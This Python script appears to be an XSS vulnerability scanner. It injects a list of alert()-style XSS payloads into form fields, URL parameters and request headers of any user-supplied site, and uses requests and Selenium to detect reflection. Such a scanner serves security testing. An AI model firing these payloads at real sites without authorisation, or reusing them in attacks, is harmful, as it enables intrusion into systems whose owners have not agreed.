import requests
from urllib.parse import quote
from urllib.parse import quote, urljoin
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
# from selenium.webdriver.chrome.options import Options # For Chrome-based browsers, uncomment this
from selenium.webdriver.safari.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

xss_payloads = [
    "<script>alert('XSS1')</script>",
    "{Son.constructor(alert(1))0}",
    "<img src=x onerror=alert('XSS2')>",
    "<svg/onload=alert('XSS3')>",
    "<body onload=alert('XSS4')>",
    "<iframe src=javascript:alert('XSS5')></iframe>",
    "';alert('XSS6');//",
    "<math><maction xlink:href=\"javascript:alert('XSS7')\"></maction></math>",
    "<link rel=stylesheet href=data:text/css,*{background:url('javascript:alert(\"XSS8\")')}>",
    "<object data='javascript:alert(\"XSS9\")'></object>",
    "<embed src='javascript:alert(\"XSS10\")'></embed>",
    "<script src=\"data:text/javascript,alert('XSS11')\"></script>",
    "<img src=1 href=1 onerror=javascript:alert('XSS12')>",
    "<details open ontoggle=alert('XSS13')></details>",
    "<b onmouseover=alert('XSS14')>hover here</b>",
    "<input autofocus onfocus=alert('XSS15')>",
    "<marquee onstart=alert('XSS16')>XSS</marquee>",
    "<isindex action=javascript:alert('XSS17')>",
    "<form><button formaction=javascript:alert('XSS18')>Click</button></form>",
    "javascript:alert('XSS19')",
    "'><script>alert('XSS20')</script>",
    "</textarea><script>alert('XSS21')</script>",
    "<input type='text' value='<script>alert(\"XSS22\")'>",
    "<!--<svg/onload=alert(\"XSS23\")>-->",
]

def setup_selenium():
    # options = Options()
    # options.add_argument("--headless")
    # options.add_argument("--disable-gpu")
    # options.add_argument("--no-sandbox")
    # driver_service = Service('/path/to/chromedriver')
    # driver = webdriver.Chrome(service=driver_service, options=options)

    #commented code is for chrome-based browsers, uncommented is for mac on Safari

    options = Options()
    driver = webdriver.Safari(options=options)
    
    return driver

def find_forms(url, session):
    forms = []
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for form in soup.find_all('form'):
            form_data = {
                'action': urljoin(url, form.get('action', '')),
                'method': form.get('method', 'get').lower(),
                'inputs': []
            }
            for input_field in form.find_all(['input', 'textarea']):
                if input_field.get('type') not in ['submit', 'button', 'image']:
                    form_data['inputs'].append({
                        'name': input_field.get('name', ''),
                        'type': input_field.get('type', 'text')
                    })
            forms.append(form_data)
    except requests.RequestException:
        pass
    return forms

def test_form_xss(form, session, headers):
    results = {}
    for payload in xss_payloads:
        try:
            form_data = {}
            for input_field in form['inputs']:
                form_data[input_field['name']] = payload

            if form['method'] == 'post':
                response = session.post(form['action'], data=form_data, headers=headers, timeout=10)
            else:
                response = session.get(form['action'], params=form_data, headers=headers, timeout=10)

            if payload in response.text:
                results[form['action']] = {
                    'type': f"Form ({form['method'].upper()})",
                    'payload': payload,
                    'context': response.text[:500]
                }
        except requests.RequestException:
            continue
    return results

def test_xss(url):
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
    }
    results = {}

    forms = find_forms(url, session)
    for form in forms:
        form_results = test_form_xss(form, session, headers)
        results.update(form_results)

    test_urls = [
        f"{url}?test_param=",
        f"{url}/search?q=",
        f"{url}/filter?query=",
        f"{url}/test",
    ]
    headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For"]
    
    for test_url in test_urls:
        for payload in xss_payloads:
            encoded_payload = quote(payload)
            try:
                target_url = f"{test_url}{encoded_payload}"
                response = session.get(target_url, headers=headers, timeout=10)
                if payload in response.text:
                    results[target_url] = {"type": "URL", "payload": payload, "context": response.text[:500]}
            except requests.RequestException:
                continue

            for header in headers_to_test:
                try:
                    test_headers = headers.copy()
                    test_headers[header] = payload
                    response = session.get(test_url, headers=test_headers, timeout=10)
                    if payload in response.text:
                        results[test_url] = {"type": "Header", "payload": payload, "header": header, "context": response.text[:500]}
                except requests.RequestException:
                    continue

    return results

def test_xss_with_selenium(url, payloads):
    driver = setup_selenium()
    dom_results = []

    try:
        driver.get(url)
        time.sleep(2)
        
        try:
            forms = driver.find_elements(By.TAG_NAME, "form")
            
            for form in forms:
                inputs = form.find_elements(By.TAG_NAME, "input")
                for payload in payloads:
                    try:
                        for input_field in inputs:
                            input_type = input_field.get_attribute("type")
                            if input_type not in ["submit", "button", "image", "hidden"]:
                                input_field.clear()
                                input_field.send_keys(payload)
                        
                        form.submit()
                        time.sleep(2)
                        
                        if payload in driver.page_source:
                            dom_results.append({
                                "url": driver.current_url,
                                "payload": payload,
                                "type": "Form"
                            })
                        
                        driver.back()
                        time.sleep(1)
                    except Exception:
                        driver.get(url)
                        time.sleep(1)
                        continue
        except Exception:
            print("No forms found on the page or error accessing forms")

        for payload in payloads:
            try:
                test_url = f"{url}?test_param={quote(payload)}"
                driver.get(test_url)
                time.sleep(2)
                if payload in driver.page_source:
                    dom_results.append({
                        "url": driver.current_url,
                        "payload": payload,
                        "type": "URL"
                    })
            except Exception:
                continue

    finally:
        driver.quit()
    
    return dom_results

def main():
    target_url = input("Enter the URL of the website to test for XSS: ").strip()
    if not target_url.startswith("http"):
        print("Please enter a valid URL starting with http:// or https://")
        return

    print(f"Testing {target_url} for XSS vulnerabilities...")

    print("Testing with requests...")
    results = test_xss(target_url)
    
    print("Testing with Selenium...")
    dom_results = test_xss_with_selenium(target_url, xss_payloads)

    print("\nXSS Test Results (Requests):")
    if results:
        for url, details in results.items():
            print(f"URL: {url}")
            print(f"Type: {details['type']}")
            print(f"Payload: {details['payload']}")
            print(f"Context: {details.get('context', '')[:100]}...")
            print()
    else:
        print("No vulnerabilities found with requests.")

    print("\nXSS Test Results (Selenium):")
    if dom_results:
        for result in dom_results:
            print(f"Type: {result['type']}")
            print(f"Payload: {result['payload']}")
            print(f"URL: {result['url']}")
            print()
    else:
        print("No DOM-based vulnerabilities found.")

if __name__ == "__main__":
    main()